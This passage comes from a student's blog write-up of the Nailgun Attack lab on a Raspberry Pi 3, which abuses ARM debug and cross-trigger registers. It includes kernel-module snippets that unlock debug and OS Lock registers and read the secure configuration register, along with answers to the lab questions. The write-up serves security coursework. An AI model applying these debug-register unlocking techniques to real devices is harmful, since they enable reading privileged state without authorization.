+<p><strong>DBGDTRTXint</strong> is a 32-bit debug register that allows
+the processor to transfer data to an external debugger. It is accessed
+using the <strong>MCR instruction</strong>, for example:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MCR p14, 0, Rt, c0, c5, 0</span><br></pre></td></tr></table></figure>
+<p>In terms of a 32-bit value for C code execution:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ee001e15 &lt;=&gt; mcr p14,0,R1,c0,c5,0</span></span><br><span class="line">execute_ins_via_itr(param-&gt;debug_register, <span class="number">0x1e15ee00</span>);</span><br></pre></td></tr></table></figure>
+<p>Register DBGDTRTXint bits [31:0] are architecturally mapped to
+DBGDTRTX_EL0[31:0].</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scr = ioread32(param-&gt;debug_register + DBGDTRTX_OFFSET);</span><br></pre></td></tr></table></figure>
+<h5 id="task-6-restore-the-context-and-exit">Task 6: Restore the Context
+and Exit</h5>
+<p><img src="/2025/11/Nailgun-Attack-Lab-Analysis/t6.png" /></p>
+<p>The value of SCR is
+<code>0x00000131</code>(<code>0b100110001</code>)</p>
+<p><img src="/2025/11/Nailgun-Attack-Lab-Analysis/t6_2.png" /></p>
+<p><strong>Key meanings of SCR = 0x131</strong></p>
+<ul>
+<li><p>PE is in Non-secure state.</p></li>
+<li><p>An FIQ taken from either Security state is masked by PSTATE.F.
+When PSTATE.F is 0, the FIQ is taken to EL3.</p></li>
+<li><p>External aborts taken from either Security state are masked by
+PSTATE.A. When PSTATE.A is 0, the abort is taken to EL3.</p></li>
+<li><p>HVC instructions are enabled at Non-secure EL1 and EL2.</p></li>
+</ul>
+<h5 id="question-1">Question 1:</h5>
+<p>During this lab, what is the base address of Cross Trigger Interface
+in Raspberry Pi 3? Can your find the global address of CTICONTROL
+register in Raspberry Pi 3 according to the Arm Reference Manual? Answer
+the address value and show your calculation. (hint: Find the offset)</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 0x40038000 is the base address of the cross trigger interface registers on Core 0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CTI_REGISTER_ADDR 0x40038000</span></span><br></pre></td></tr></table></figure>
+<p><img src="/2025/11/Nailgun-Attack-Lab-Analysis/q1.png" /></p>
+<p>The global address of the <strong>CTICONTROL</strong> register is
+calculated as:</p>
+<p><span class="math display">$$\begin{aligned} \text{Global Address}
+&amp;= \text{Base Address} + \text{Offset} \\ &amp;= 0\text{x}40038000 +
+0\text{x}0 \\ &amp;= \mathbf{0\text{x}40038000}
+\end{aligned}$$</span></p>
+<p>Therefore, the <strong>CTICONTROL register is located at address
+0x40038000.</strong></p>
+<h5 id="question-2">Question 2:</h5>
+<p>Do we have another way to unlock the OS Lock in this lab except
+memory mapping? If yes, how to do that? Justify your answer.</p>
+<p><img src="/2025/11/Nailgun-Attack-Lab-Analysis/q2.png" /></p>
+<p>Extract Step 1 (the part that unlocks debug and cross-trigger
+registers) from the <code>read_scr()</code> function, and modify it so
+that instead of unlocking the OS Lock, it <strong>locks</strong> it.</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">read_scr1</span><span class="params">(<span class="type">void</span> *addr)</span>&#123;</span><br><span class="line">    <span class="comment">// Step 1: Unlock debug and cross trigger reigsters</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">nailgun_param</span> *<span class="title">param</span> =</span> (<span class="keyword">struct</span> nailgun_param*)addr;</span><br><span class="line">    printk(KERN_INFO<span class="string">&quot;Step 1: Unlock debug and cross trigger registers\n&quot;</span>);</span><br><span class="line">    iowrite32(<span class="number">0xC5ACCE55</span>, param-&gt;debug_register + EDLAR_OFFSET);</span><br><span class="line">    iowrite32(<span class="number">0xC5ACCE55</span>, param-&gt;cti_register + EDLAR_OFFSET);</span><br><span class="line">    printk(KERN_INFO<span class="string">&quot;Step 1(Add): Lock OS registers\n&quot;</span>);</span><br><span class="line">    iowrite32(<span class="number">0xC5ACCE55</span>, param-&gt;debug_register + OSLAR_OFFSET);</span><br><span class="line">    iowrite32(<span class="number">0xC5ACCE55</span>, param-&gt;cti_register + OSLAR_OFFSET);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>unlock the OS Lock <strong>by executing the code directly on core
+0.</strong></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">unlock_debug</span><span class="params">(<span class="type">void</span>* _)</span> &#123;</span><br><span class="line">	<span class="comment">// Unlock self debug registers</span></span><br><span class="line">	printk(KERN_INFO <span class="string">&quot;Step 1(Add): unlock the OS Lock not using MAP\n&quot;</span>);</span><br><span class="line">	<span class="type">uint32_t</span> reg = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">asm</span> <span class="title function_">volatile</span><span class="params">(<span class="string">&quot;mcr p14, 0, %0, c1, c0, 4&quot;</span>:<span class="string">&quot;=r&quot;</span>(reg))</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>Change <code>nailgun_init</code> <strong>as follows:</strong></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">smp_call_function_single(<span class="number">1</span>,read_scr1,param,<span class="number">1</span>);</span><br><span class="line">smp_call_function_single(<span class="number">0</span>, unlock_debug, param, <span class="number">1</span>);</span><br><span class="line">smp_call_function_single(<span class="number">1</span>,read_scr,param,<span class="number">1</span>);</span><br></pre></td></tr></table></figure>
+<p>Therefore, we can unlock the OS Lock in this lab except memory
+mapping</p>
+<p><img src="/2025/11/Nailgun-Attack-Lab-Analysis/q2_2.png" /></p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/Security/" rel="tag"># Security</a>
+              <a href="/tags/Linux/" rel="tag"># Linux</a>
+              <a href="/tags/Attack/" rel="tag"># Attack</a>
+              <a href="/tags/ARM/" rel="tag"># ARM</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2025/11/CS323-Assignment-4/" rel="prev" title="CS323 Written Assignment 4 - SLR, CLR, and LALR Parsing">
+                  <i class="fa fa-angle-left"></i> CS323 Written Assignment 4 - SLR, CLR, and LALR Parsing
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2025/11/Dirty-COW-Attack/" rel="next" title="Dirty COW Attack Lab">
+                  Dirty COW Attack Lab <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 2024 – 
+    <span itemprop="copyrightYear">2025</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">Lin Wenqi</span>
+  </div>
+<div class="wordcount">
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-line"></i>
+    </span>
+    <span title="站点总字数">24k</span>
+  </span>
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">22 分钟</span>
+  </span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+<script>
+  // 自动移除 URL 中的 highlight 参数
+  if (window.location.search.includes('highlight=')) {
+    const url = new URL(window.location.href);
+    url.searchParams.delete('highlight');
+    window.history.replaceState({}, document.title, url.pathname + url.hash);
+  }
+</script>
+</body>
+</html>
